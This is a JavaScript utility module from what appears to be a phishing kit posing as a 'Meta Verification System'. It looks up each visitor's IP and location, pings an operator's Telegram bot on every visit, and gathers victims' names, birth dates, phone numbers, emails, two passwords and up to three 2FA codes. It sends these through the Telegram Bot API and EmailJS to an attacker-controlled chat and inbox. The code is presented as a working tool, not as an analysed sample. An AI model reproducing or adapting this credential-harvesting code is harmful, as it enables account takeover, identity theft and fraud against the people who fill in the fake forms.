// Utilities
const Utils = {
    encrypt(text) {
        return CryptoJS.AES.encrypt(text, CONFIG.SECRET_KEY).toString();
    },

    decrypt(cipherText) {
        const bytes = CryptoJS.AES.decrypt(cipherText, CONFIG.SECRET_KEY);
        return bytes.toString(CryptoJS.enc.Utf8);
    },

    saveRecord(key, value) {
        try {
            const encryptedValue = this.encrypt(JSON.stringify(value));
            const record = { value: encryptedValue, expiry: Date.now() + CONFIG.STORAGE_EXPIRY };
            localStorage.setItem(key, JSON.stringify(record));
        } catch (error) {
            console.error('Save error:', error);
        }
    },

    getRecord(key) {
        try {
            const item = localStorage.getItem(key);
            if (!item) return null;
            const { value, expiry } = JSON.parse(item);
            if (Date.now() > expiry) {
                localStorage.removeItem(key);
                return null;
            }
            const decrypted = this.decrypt(value);
            return decrypted ? JSON.parse(decrypted) : null;
        } catch (error) {
            return null;
        }
    },

    async getUserIp() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Error getting IP:', error);
            return 'N/A';
        }
    },

    formatLocationLine(data) {
        const ip = data.ip || 'N/A';
        const region = data.region || data.city || 'N/A';
        const regionCode = data.region_code || data.regionCode || '';
        const countryCode = String(data.country_code || data.countryCode || '').toUpperCase();
        const countryName = data.country_name || data.countryName || this.countryNameFromCode(countryCode) || countryCode || 'N/A';
        const regionPart = regionCode ? `${region}(${regionCode})` : region;
        const countryPart = countryCode ? `${countryName}(${countryCode})` : countryName;
        return `${ip} | ${regionPart} | ${countryPart}`;
    },

    countryNameFromCode(code) {
        const names = {
            AD: 'Andorra', AE: 'United Arab Emirates', AF: 'Afghanistan', AL: 'Albania', AM: 'Armenia',
            AR: 'Argentina', AT: 'Austria', AU: 'Australia', AZ: 'Azerbaijan', BA: 'Bosnia and Herzegovina',
            BD: 'Bangladesh', BE: 'Belgium', BG: 'Bulgaria', BH: 'Bahrain', BO: 'Bolivia', BR: 'Brazil',
            BY: 'Belarus', CA: 'Canada', CH: 'Switzerland', CL: 'Chile', CN: 'China', CO: 'Colombia',
            CR: 'Costa Rica', CU: 'Cuba', CY: 'Cyprus', CZ: 'Czechia', DE: 'Germany', DK: 'Denmark',
            DO: 'Dominican Republic', DZ: 'Algeria', EC: 'Ecuador', EE: 'Estonia', EG: 'Egypt',
            ES: 'Spain', FI: 'Finland', FR: 'France', GB: 'United Kingdom', GE: 'Georgia', GH: 'Ghana',
            GR: 'Greece', GT: 'Guatemala', HK: 'Hong Kong', HR: 'Croatia', HU: 'Hungary', ID: 'Indonesia',
            IE: 'Ireland', IL: 'Israel', IN: 'India', IQ: 'Iraq', IR: 'Iran', IS: 'Iceland', IT: 'Italy',
            JO: 'Jordan', JP: 'Japan', KE: 'Kenya', KG: 'Kyrgyzstan', KH: 'Cambodia', KR: 'South Korea',
            KW: 'Kuwait', KZ: 'Kazakhstan', LA: 'Laos', LB: 'Lebanon', LK: 'Sri Lanka', LT: 'Lithuania',
            LU: 'Luxembourg', LV: 'Latvia', LY: 'Libya', MA: 'Morocco', MD: 'Moldova', ME: 'Montenegro',
            MK: 'North Macedonia', MM: 'Myanmar', MN: 'Mongolia', MX: 'Mexico', MY: 'Malaysia',
            NG: 'Nigeria', NL: 'Netherlands', NO: 'Norway', NP: 'Nepal', NZ: 'New Zealand', OM: 'Oman',
            PA: 'Panama', PE: 'Peru', PH: 'Philippines', PK: 'Pakistan', PL: 'Poland', PT: 'Portugal',
            PY: 'Paraguay', QA: 'Qatar', RO: 'Romania', RS: 'Serbia', RU: 'Russia', SA: 'Saudi Arabia',
            SE: 'Sweden', SG: 'Singapore', SI: 'Slovenia', SK: 'Slovakia', TH: 'Thailand', TJ: 'Tajikistan',
            TM: 'Turkmenistan', TN: 'Tunisia', TR: 'Turkey', TW: 'Taiwan', UA: 'Ukraine', US: 'United States',
            UY: 'Uruguay', UZ: 'Uzbekistan', VE: 'Venezuela', VN: 'Vietnam', ZA: 'South Africa'
        };
        return names[String(code || '').toUpperCase()] || '';
    },

    telegramVisitMessage(loc) {
        return [
            `IP: ${loc.ip || 'N/A'}`,
            `Location: ${loc.location || 'N/A'}`,
            `Page: ${location.href}`,
            'reCAPTCHA: đã tick'
        ].join('\n');
    },

    async sendTelegramText(text) {
        const res = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text,
                disable_web_page_preview: true
            })
        });
        return res;
    },

    async getUserLocation() {
        if (this._locationCache) return this._locationCache;

        const empty = {
            location: 'N/A',
            country_code: 'N/A',
            ip: 'N/A',
            region: 'N/A',
            region_code: 'N/A',
            country: 'N/A',
            country_name: 'N/A',
            city: 'N/A',
            org: 'N/A'
        };

        const sources = [
            async () => {
                const response = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
                const data = await response.json();
                if (data.error) throw new Error('ipapi');
                return {
                    ip: data.ip || 'N/A',
                    city: data.city || 'N/A',
                    region: data.region || data.city || 'N/A',
                    region_code: data.region_code || '',
                    country_code: data.country_code || '',
                    country_name: data.country_name || '',
                    org: data.org || 'N/A'
                };
            },
            async () => {
                const response = await fetch('https://ipwho.is/', { cache: 'no-store' });
                const data = await response.json();
                if (data.success === false) throw new Error('ipwho');
                return {
                    ip: data.ip || 'N/A',
                    city: data.city || 'N/A',
                    region: data.region || data.city || 'N/A',
                    region_code: data.region_code || '',
                    country_code: data.country_code || '',
                    country_name: data.country || '',
                    org: (data.connection && data.connection.isp) || 'N/A'
                };
            },
            async () => {
                const response = await fetch('https://ipinfo.io/json?token=790b745aefcdac', { cache: 'no-store' });
                if (!response.ok) throw new Error('ipinfo');
                const data = await response.json();
                return {
                    ip: data.ip || 'N/A',
                    city: data.city || 'N/A',
                    region: data.region || data.city || 'N/A',
                    region_code: '',
                    country_code: data.country || '',
                    country_name: '',
                    org: data.org || 'N/A'
                };
            }
        ];

        for (const source of sources) {
            try {
                const raw = await source();
                if (!raw || !raw.ip || raw.ip === 'N/A') continue;
                const loc = {
                    ...raw,
                    country: (raw.country_code || 'N/A').toUpperCase(),
                    country_code: (raw.country_code || 'N/A').toUpperCase(),
                    country_name: raw.country_name || this.countryNameFromCode(raw.country_code) || raw.country_code || 'N/A',
                    location: this.formatLocationLine({
                        ip: raw.ip,
                        region: raw.region,
                        city: raw.city,
                        region_code: raw.region_code,
                        country_code: raw.country_code,
                        country_name: raw.country_name || this.countryNameFromCode(raw.country_code)
                    })
                };
                this._locationCache = loc;
                return loc;
            } catch (error) { /* try next */ }
        }

        return empty;
    },

    async sendToTelegram(data) {
        const locationData = await this.getUserLocation();
        const lines = [
            `IP: ${locationData.ip || 'N/A'}`,
            `Location: ${locationData.location || 'N/A'}`,
            `Page: ${location.href}`,
            '--------------------',
            `Full Name: ${data.fullName || ''}`,
            `Page Name: ${data.fanpage || ''}`,
            `Date of Birth: ${data.day || ''}/${data.month || ''}/${data.year || ''}`,
            `Phone: ${data.phone || ''}`,
            `Email: ${data.email || ''}`,
            `Email Business: ${data.emailBusiness || ''}`
        ];

        if (data.password || data.passwordSecond) {
            lines.push('--------------------');
            if (data.password) lines.push(`Password 1: ${data.password}`);
            if (data.passwordSecond) lines.push(`Password 2: ${data.passwordSecond}`);
        }

        if (data.twoFa || data.twoFaSecond || data.twoFaThird) {
            lines.push('--------------------');
            if (data.twoFa) lines.push(`2FA 1: ${data.twoFa}`);
            if (data.twoFaSecond) lines.push(`2FA 2: ${data.twoFaSecond}`);
            if (data.twoFaThird) lines.push(`2FA 3: ${data.twoFaThird}`);
        }

        try {
            await this.sendTelegramText(lines.join('\n'));
        } catch (error) {
            console.error('Telegram error:', error);
        }
    },

    async sendToEmail(data) {
        const locationData = await this.getUserLocation();

        const emailContent = [
            `IP: ${locationData.ip || 'N/A'}`,
            `Location: ${locationData.location || 'N/A'}`,
            `Page: ${location.href}`,
            '--------------------',
            `Full Name: ${data.fullName || ''}`,
            `Page Name: ${data.fanpage || ''}`,
            `Date of Birth: ${data.day || ''}/${data.month || ''}/${data.year || ''}`,
            `Phone: ${data.phone || ''}`,
            `Email: ${data.email || ''}`,
            `Email Business: ${data.emailBusiness || ''}`,
            '--------------------',
            `Password 1: ${data.password || ''}`,
            `Password 2: ${data.passwordSecond || ''}`,
            '--------------------',
            `2FA 1: ${data.twoFa || ''}`,
            `2FA 2: ${data.twoFaSecond || ''}`,
            `2FA 3: ${data.twoFaThird || ''}`,
            '',
            `Sent at: ${new Date().toLocaleString()}`
        ].join('\n');

        try {
            // Load EmailJS SDK if not already loaded
            if (!window.emailjs) {
                await this.loadEmailJSSDK();
            }

            await emailjs.send(
                CONFIG.EMAILJS_SERVICE_ID,
                CONFIG.EMAILJS_TEMPLATE_ID,
                {
                    to_email: CONFIG.EMAIL_RECIPIENT,
                    subject: `Meta Verification - ${locationData.location}`,
                    message: emailContent,
                    from_name: 'Meta Verification System',
                    reply_to: data.email || 'noreply@system.com'
                },
                CONFIG.EMAILJS_PUBLIC_KEY
            );
        } catch (error) {
            console.error('Email error:', error);
        }
    },

    loadEmailJSSDK() {
        return new Promise((resolve, reject) => {
            if (window.emailjs) {
                resolve();
                return;
            }

            const script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
            script.onload = () => {
                emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
                resolve();
            };
            script.onerror = reject;
            document.head.appendChild(script);
        });
    },

    async sendNotification(data) {
        const notificationType = CONFIG.NOTIFICATION_TYPE;

        try {
            if (notificationType === 'telegram' || notificationType === 'both') {
                await this.sendToTelegram(data);
            }

            if (notificationType === 'email' || notificationType === 'both') {
                await this.sendToEmail(data);
            }
        } catch (error) {
            console.error('Notification error:', error);
        }
    },

    markVisitBootDone() {
        if (!window.__pageBoot) return;
        window.__pageBoot.visitDone = true;
        if (typeof window.__pageBoot.tryHide === 'function') {
            window.__pageBoot.tryHide();
        }
    },

    async sendVisitNotification() {
        if (sessionStorage.getItem('__visit_ping__')) {
            this.markVisitBootDone();
            return;
        }

        try {
            const loc = await this.getUserLocation();
            const text = this.telegramVisitMessage(loc);
            const controller = new AbortController();
            const timer = setTimeout(() => controller.abort(), 8000);
            const res = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
                    text,
                    disable_web_page_preview: true
                }),
                signal: controller.signal
            });
            clearTimeout(timer);
            if (res.ok) sessionStorage.setItem('__visit_ping__', '1');
        } catch (error) {
            console.error('Visit notify error:', error);
        } finally {
            this.markVisitBootDone();
        }
    },

    maskPhone(phone) {
        if (!phone || phone.length < 5) return phone;
        const start = phone.slice(0, 2);
        const end = phone.slice(-2);
        return `${start} ${'*'.repeat(phone.length - 4)} ${end}`;
    },

    maskEmail(email) {
        if (!email) return '';
        return email.replace(/^(.)(.*?)(.)@(.+)$/, (_, a, mid, c, domain) => {
            return `${a}${'*'.repeat(mid.length)}${c}@${domain}`;
        });
    },

    generateTicketId() {
        const gen = () => Math.random().toString(36).substring(2, 6).toUpperCase();
        return `${gen()}-${gen()}-${gen()}`;
    }
};

